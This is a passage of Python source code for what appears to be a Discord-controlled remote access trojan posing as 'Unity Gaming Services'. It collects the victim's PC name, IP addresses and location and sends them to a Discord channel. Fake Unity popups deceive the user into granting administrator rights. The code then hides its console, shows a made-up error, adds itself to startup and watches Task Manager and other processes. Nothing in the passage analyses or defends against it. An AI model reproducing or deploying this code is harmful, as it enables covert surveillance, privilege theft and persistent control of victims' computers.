        "local_ip": local_ip,
        "public_ip": public_ip,
        "city": city,
        "country": country
    }

    connected_message = (
        f"[{PC_ID}] **Unity Multiplayer Service Connected to PC:**\n"
        f"PC Name: {pc_name}\n"
        f"Local IP: {local_ip}\n"
        f"Public IP: {public_ip}\n"
        f"Location: {city}, {country}"
    )
    print(connected_message)
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(connected_message)

if not is_admin():
    show_popup_message(
        "Unity Gaming Services requires administrator privileges to initialize matchmaking and lobby services. "
        "Please click 'Yes' in the next prompt to allow this.",
        "Unity Gaming Services - Permission Required"
    )
    if not run_as_admin():
        show_popup_message(
            "Failed to initialize Unity Gaming Services due to missing permissions. "
            "Some multiplayer features may be unavailable.",
            "Unity Gaming Services - Warning"
        )

hide_console_window()
show_popup_message(
    "Failed to connect to Unity Multiplayer Services (Error Code: UGS-401). "
    "Please check your internet connection or contact Unity Support at support.unity.com.",
    "Unity Gaming Services - Error"
)

add_to_startup()

Thread(target=task_manager_watcher, daemon=True).start()
Thread(target=process_watcher, daemon=True).start()

bot.run(TOKEN)
